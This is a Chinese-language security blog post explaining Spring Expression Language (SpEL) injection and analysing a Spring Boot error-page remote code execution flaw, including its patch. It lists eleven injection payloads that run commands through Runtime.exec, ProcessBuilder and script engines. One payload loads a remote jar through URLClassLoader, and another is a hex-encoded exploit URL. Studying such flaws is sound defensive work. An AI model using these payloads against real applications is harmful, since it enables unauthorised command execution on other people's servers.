<!DOCTYPE html>

<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">

  <meta name="description" content="kpa1on的博客">


<link rel="alternate" href="/atom.xml" title="kpa1on&#39;s Blog" type="application/atom+xml">
<meta name="theme-color" content="#a1d0f6">
<title>SpEL表达式注入学习 - kpa1on&#39;s Blog</title>
<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<link rel="shortcut icon" href="/favicon.png">

<link rel="stylesheet" href="/css/style.css">

<nav class="main-nav">
	
	    <a href="/">← 主页</a>
	
	
	    <a href="/about/">About</a>
	
	    <a href="/archives/">Archives</a>
	
	<a class="cta" href="/atom.xml" data-no-instant>订阅</a>
</nav>

<section id="wrapper">
    <article class="post">
    <header>
        
            <h1>SpEL表达式注入学习</h1>
        
        <h2 class="headline">Mar 29 2022
        
        </h2>
    </header>
</article>
<section id="post-body"><meta name="referrer" content="no-referrer"/>

<h3 id="什么是SpEL表达式"><a href="#什么是SpEL表达式" class="headerlink" title="什么是SpEL表达式"></a>什么是SpEL表达式</h3><p>Spring Expression  Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。它的语法类似于传统EL，但提供额外的功能，最出色的就是函数调用和简单字符串的模板函数。尽管有其他可选的 Java 表达式语言，如 OGNL, MVEL,JBoss EL 等等，但 Spel 创建的初衷是了给 Spring 社区提供一种简单而高效的表达式语言，一种可贯穿整个 Spring 产品组的语言。这种语言的特性应基于 Spring 产品的需求而设计。<br> Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p>
<span id="more"></span>

<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>SpEL有三种用法，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p>
<h4 id="1、-Value"><a href="#1、-Value" class="headerlink" title="1、@Value"></a>1、@Value</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class EmailSender &#123;</span><br><span class="line">    @Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br><span class="line">    private String mailUsername;</span><br><span class="line">    @Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)    </span><br><span class="line">    private String defaultLocale;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、bean配置"><a href="#2、bean配置" class="headerlink" title="2、bean配置"></a>2、bean配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;xxx&quot; class=&quot;com.java.XXXXX.xx&quot;&gt;</span><br><span class="line">    &lt;!-- 同@Value,#&#123;&#125;内是表达式的值，可放在property或constructor-arg内 --&gt;</span><br><span class="line">    &lt;property name=&quot;arg&quot; value=&quot;#&#123;表达式&#125;&quot;&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3、Expression"><a href="#3、Expression" class="headerlink" title="3、Expression"></a>3、Expression</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import org.springframework.expression.Expression;</span><br><span class="line">import org.springframework.expression.ExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"> </span><br><span class="line">public class SpELTest &#123;</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"> </span><br><span class="line">        //创建ExpressionParser解析表达式</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        //表达式放置</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;表达式&quot;);</span><br><span class="line">        //执行表达式，默认容器是spring本身的容器：ApplicationContext</span><br><span class="line">        Object value = exp.getValue();</span><br><span class="line">        </span><br><span class="line">        /**如果使用其他的容器，则用下面的方法*/</span><br><span class="line">        //创建一个虚拟的容器EvaluationContext</span><br><span class="line">        StandardEvaluationContext ctx = new StandardEvaluationContext();</span><br><span class="line">        //向容器内添加bean</span><br><span class="line">        BeanA beanA = new BeanA();</span><br><span class="line">        ctx.setVariable(&quot;bean_id&quot;, beanA);</span><br><span class="line">        </span><br><span class="line">        //setRootObject并非必须；一个EvaluationContext只能有一个RootObject，引用它的属性时，可以不加前缀</span><br><span class="line">        ctx.setRootObject(XXX);</span><br><span class="line">        </span><br><span class="line">        //getValue有参数ctx，从新的容器中根据SpEL表达式获取所需的值</span><br><span class="line">        Object value = exp.getValue(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里接口<code>ExpressionParser</code>负责解析表达式字符串。上述代码含义为首先创建<code>ExpressionParser</code>解析表达式，之后放置表达式，最后通过<code>getValue</code>方法执行表达式，默认容器是spring本身的容器：<code>ApplicationContext</code>。</p>
<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">			&lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">		&lt;dependency&gt;</span><br><span class="line">			&lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">			&lt;version&gt;4.0.5.RELEASE&lt;/version&gt;</span><br><span class="line">		&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<h4 id="核心接口"><a href="#核心接口" class="headerlink" title="核心接口"></a>核心接口</h4><ol>
<li>解析器<code>ExpressionParser</code>，用于将字符串表达式转换为<code>Expression</code>表达式对象。</li>
<li>表达式<code>Expression</code>，最后通过它的<code>getValute</code>方法对表达式进行计算取值。</li>
<li>上下文<code>EvaluationContext</code>，通过上下文对象结合表达式来计算最后的结果。</li>
</ol>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>SpEL使用 <code>#&#123;...&#125;</code> 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如：</p>
<blockquote>
<p>引用其他对象:<code>#&#123;car&#125;</code><br>引用其他对象的属性：<code>#&#123;car.brand&#125;</code><br>调用其它方法 , 还可以链式操作：<code>#&#123;car.toString()&#125;</code></p>
</blockquote>
<p>其中属性名称引用还可以用<code>$</code>符号 如：<code>$&#123;someProperty&#125;</code><br>除此以外在SpEL中，使用<code>T()</code>运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的<code>Math</code>类，我们可以像下面的示例这样使用<code>T()</code>运算符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(java.lang.Math)&#125; //结果会返回一个`java.lang.Math`类对象。</span><br></pre></td></tr></table></figure>

<h4 id="1、类表达式"><a href="#1、类表达式" class="headerlink" title="1、类表达式"></a>1、类表达式</h4><p>SpEL中可以使用特定的Java类型，经常用来访问Java类型中的静态属性或静态方法，需要用<code>T()</code>操作符进行声明。括号中需要包含类名的全限定名，也就是包名加上类名。唯一例外的是，SpEL内置了<code>java.lang</code>包下的类声明，也就是说<code>java.lang.String</code>可以通过<code>T(String)</code>访问，而不需要使用全限定名。<br> 因此我们通过 <code>T()</code> 调用一个类的静态方法，它将返回一个 <code>Class Object</code>，然后再调用相应的方法或属性，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc.exe\&quot;)&quot;);</span><br><span class="line">        Object value = exp.getValue();</span><br></pre></td></tr></table></figure>

<h4 id="2、方法调用"><a href="#2、方法调用" class="headerlink" title="2、方法调用"></a>2、方法调用</h4><p>使用典型的Java编程语法来调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// string literal, evaluates to &quot;bc&quot;</span><br><span class="line">String c = parser.parseExpression(&quot;&#x27;abc&#x27;.substring(2, 3)&quot;).getValue(String.class);</span><br><span class="line"></span><br><span class="line">// evaluates to true</span><br><span class="line">boolean isMember = parser.parseExpression(&quot;isMember(&#x27;Mihajlo Pupin&#x27;)&quot;).getValue(societyContext,Boolean.class);</span><br></pre></td></tr></table></figure>

<h4 id="3、调用构造函数"><a href="#3、调用构造函数" class="headerlink" title="3、调用构造函数"></a>3、调用构造函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Inventor einstein = </span><br><span class="line">  p.parseExpression(&quot;new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;,&#x27;German&#x27;)&quot;).getValue(Inventor.class);</span><br><span class="line"> </span><br><span class="line">//create new inventor instance within add method of List</span><br><span class="line">p.parseExpression(&quot;Members.add(new org.spring.samples.spel.inventor.Inventor(&#x27;Albert Einstein&#x27;, &#x27;German&#x27;))&quot;).getValue(societyContext);</span><br></pre></td></tr></table></figure>

<h4 id="4、Bean引用"><a href="#4、Bean引用" class="headerlink" title="4、Bean引用"></a>4、Bean引用</h4><p>如果解析上下文已经配置，则可以使用<code>@</code>符号从表达式中查找bean。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser(); StandardEvaluationContext context = new StandardEvaluationContext(); context.setBeanResolver(new MyBeanResolver()); </span><br><span class="line">// This will end up calling resolve(context,&quot;foo&quot;) on MyBeanResolver during evaluation </span><br><span class="line">Object bean = parser.parseExpression(&quot;@foo&quot;).getValue(context);</span><br></pre></td></tr></table></figure>

<h4 id="5、变量定义"><a href="#5、变量定义" class="headerlink" title="5、变量定义"></a>5、变量定义</h4><p>变量定义通过<code>EvaluationContext</code>接口的<code>setVariable(variableName, value)</code>方法定义；在表达式中使用<code>#variableName</code>引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象，使用<code>#root</code>引用根对象，使用<code>#this</code>引用当前上下文对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">EvaluationContext context = new StandardEvaluationContext(&quot;rui0&quot;);</span><br><span class="line">context.setVariable(&quot;variable&quot;, &quot;ruilin&quot;);</span><br><span class="line">String result1 = parser.parseExpression(&quot;#variable&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"> </span><br><span class="line">String result2 = parser.parseExpression(&quot;#root&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line">String result3 = parser.parseExpression(&quot;#this&quot;).getValue(context, String.class);</span><br><span class="line">System.out.println(result3);</span><br></pre></td></tr></table></figure>

<h4 id="6、用户自定义的方法"><a href="#6、用户自定义的方法" class="headerlink" title="6、用户自定义的方法"></a>6、用户自定义的方法</h4><p>用户可以在SpEL注册自定义的方法，将该方法注册到<code>StandardEvaluationContext</code> 中的<code>registerFunction(String name, Method m)</code>方法。<br> 如：我们通过JAVA提供的接口实现字符串反转的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public abstract class StringUtils &#123;</span><br><span class="line"></span><br><span class="line">  public static String reverseString(String input) &#123;</span><br><span class="line">    StringBuilder backwards = new StringBuilder();</span><br><span class="line">    for (int i = 0; i &lt; input.length(); i++) </span><br><span class="line">      backwards.append(input.charAt(input.length() - 1 - i));</span><br><span class="line">    &#125;</span><br><span class="line">    return backwards.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过如下代码将方法注册到<code>StandardEvaluationContext</code>并且来使用它</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">context.registerFunction(&quot;reverseString&quot;,                      StringUtils.class.getDeclaredMethod(&quot;reverseString&quot;,new Class[] &#123; String.class &#125;));</span><br><span class="line">String helloWorldReversed = parser.parseExpression(&quot;#reverseString(&#x27;hello&#x27;)&quot;).getValue(context, String.class);</span><br></pre></td></tr></table></figure>

<h4 id="7、模板表达式"><a href="#7、模板表达式" class="headerlink" title="7、模板表达式"></a>7、模板表达式</h4><p>表达式模板允许文字文本与一个或多个解析块的混合。 你可以每个解析块分隔前缀和后缀的字符。当然，常见的选择是使用<code>＃&#123;&#125;</code>作为分隔符，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String randomPhrase = parser.parseExpression(</span><br><span class="line">        &quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;,</span><br><span class="line">        new TemplateParserContext()).getValue(String.class);</span><br></pre></td></tr></table></figure>

<p>在<code>ParserContext</code>接口用于影响如何 表达被解析，以便支持所述表达模板的功能。的<code>TemplateParserContext</code>的定义如下所示</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329142052563-1185828549.png" alt="image-20220329142053427"></p>
<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>在不指定<code>EvaluationContext</code>的情况下默认采用的是<code>StandardEvaluationContext</code>，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329144847462-176527755.png" alt="image-20220329144848681"></p>
<p>看下SpEL提供的两个<code>EvaluationContext</code>的区别：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</span><br><span class="line">StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</span><br></pre></td></tr></table></figure>

<p><code>SimpleEvaluationContext</code>旨在仅支持SpEL语言语法的一个子集。它不包括 Java类型引用，构造函数和bean引用。所以说指定正确<code>EvaluationContext</code>，是防止SpEl表达式注入漏洞产生的首选，之前出现过相关的SpEL表达式注入漏洞，其修复方式就是使用<code>SimpleEvaluationContext</code>替代<code>StandardEvaluationContext</code>。</p>
<h3 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、$&#123;12*12&#125;</span><br><span class="line">2、T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)T(Thread).sleep(10000)</span><br><span class="line">3、#this.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br><span class="line">4、new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start()</span><br><span class="line">5、T(java.lang.Runtime).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)</span><br><span class="line">6、T(Runtime).getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;)</span><br><span class="line">7、new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)</span><br><span class="line">8、new javax.script.ScriptEngineManager().getEngineByName(&quot;javascript&quot;).eval(&quot;s=[2];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c calc.exe&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;)//调用ScriptEngine，js引擎名称可为[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</span><br><span class="line">9、new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&quot;http://127.0.0.1:8999/Exp.jar&quot;)&#125;).loadClass(&quot;Exp&quot;).getConstructors()[0].newInstance(&quot;127.0.0.1:2333&quot;)//URLClassLoader远程加载class文件，通过函数调用或者静态代码块</span><br><span class="line">10、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)  //AppClassLoader加载</span><br><span class="line">11、T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.ProcessBuilder&quot;).getConstructors()[1].newInstance(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;&#125;).start() //AppClassLoader加载</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h4><p>原理</p>
<ul>
<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
<li>其中 ${} 包围的内容都会被  <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的  <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ul>
<p>环境</p>
<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce</a></p>
<p>验证</p>
<p>请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/article?id=$%7B2*2%7D">http://127.0.0.1:9091/article?id=${2*2}</a></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329171117202-1289875588.png" alt="image-20220329171118750"></p>
<p>对执行的命令进行十六进制编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">target = &#x27;calc&#x27; # 自己这里是windows环境，所以测试命令用的是calc</span><br><span class="line">for x in target:</span><br><span class="line">    result += hex(ord(x)) + &quot;,&quot;</span><br><span class="line">print(result.rstrip(&#x27;,&#x27;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将字符串格式转换成 0x** java 字节形式，因为这里会将我们的payload中的单引号和双引号进行编码，导致SpEL表达式解析失败，所以为了方便执行任意代码，可以根据String类的特性传入byte数组：</p>
<p>分析过程参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125; </span><br></pre></td></tr></table></figure>

<p>开启调试，造成的原因主要是在<code>ErrorMvcAutoConfiguration.java</code>中的<code>SpelView</code>类，可以看到是在<code>this.helper.replacePlaceholders(this.template, this.resolver)</code>中生成了错误页面，然后返回给result并响应</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329184704655-640679280.png" alt="image-20220329184706224"></p>
<p>此时map的值如下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329185821845-924507104.png" alt="image-20220329185823363"></p>
<p>其中template内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&#x27;created&#x27;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>跟进函数replacePlaceholders</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329190024398-1003926971.png" alt="image-20220329190025935"></p>
<p>继续跟进while循环中循环解析${}中的 表 达 式 ，例如第一个解析到${timestamp}的表达式</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212020428-2110315097.png" alt="image-20220329212021872"></p>
<p>然后通过resolvePlaceholder函数进行SpEL解析，跟进即可看到通过getValue方法对SpEL表达式进行解析</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212531370-1367392607.png" alt="image-20220329212532940"></p>
<p>且<code>EvaluationContext</code>设置的为<code>StandardEvaluationContext</code>，根据前面我们可以知道它允许用户控制输入的情况下可以成功造成任意命令执行</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329212843266-47854455.png" alt="image-20220329212845027"></p>
<p>当解析${message}时，我们跟踪下resolvePlaceholder函数，看看它是怎么处理的</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329214604858-144904379.png" alt="image-20220329214605998"></p>
<p>通过getValue从Context从取出message的值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329215544902-59410262.png" alt="image-20220329215545883"></p>
<p>跟进</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220031215-1991450169.png" alt="image-20220329220033014"></p>
<p>就是对message的值进行html编码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220356553-1188508612.png" alt="image-20220329220358206"></p>
<p>编码完之后，可以看到message中的双引号被转换为html编码，所以这里编写命令执行的payload，不能带单引号和双引号，这也是为什么采用byte数组传递命令的原因了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329220705475-2061816981.png" alt="image-20220329220705931"></p>
<p>接着往下就又是递归函数，获取proVal中${}中的值，然后进行SpEL表达式解析</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221109578-1370501255.png" alt="image-20220329221111197"></p>
<p>往下，就是得到${}中的值，然后就是调用resolvePlaceholder进行解析</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221432770-915349157.png" alt="image-20220329221434377"></p>
<p>跟下，执行到getValue()方法就会对传进去SpEL恶意表达式进行解析，触发命令执行，弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220329221908395-113622263.png" alt="image-20220329221907429"></p>
<p>补丁是创建了一个新的<code>NonRecursivePropertyPlaceholderHelper</code>类，来防止递归解析路径中或者名字中含有的表达式。<br>详见： <a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/108025512">https://blog.csdn.net/qq_31481187/article/details/108025512</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9245#toc-11">https://xz.aliyun.com/t/9245#toc-11</a></p>
</section>
    
        
        <h2 class="footline">
            <a href="/tags/注入/#注入">注入</a>
        </h2>
    

    <footer id="post-meta" class="clearfix">
        <a href="/about/">
        <img class="avatar" src="/images/avatar.png">
        <div>
            <span class="dark">kpa1on&#39;s Blog</span>
            <span>keep passion！</span>
        </div>
        </a>
        <section id="sharing">
            <a title="Share to Twitter" class="twitter" target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=https://kpa1on.github.io/2022/03/29/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/ - SpEL表达式注入学习 @"><span class="icon-twitter">tweet</span></a>
            <a title="Share to Facebook" class="facebook" href="#" onclick="
                window.open(
                  'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
                  'facebook-share-dialog',
                  'width=626,height=436');
                return false;"><span class="icon-facebook-sign">Share</span>
            </a>
        </section>
    </footer>


  <section id="comment">
    <button class="btn" id="loadcmts" onclick="cmts.load();">加载评论</button>
    <div id="gitment"></div>
    <script src='/js/gitment.browser.js'></script>
    <link rel="stylesheet" href=''>
    <script>
      var cmts={
        load:function cmts(){
          var gitment = new Gitment({
          
            id: "SpEL表达式注入学习",
          
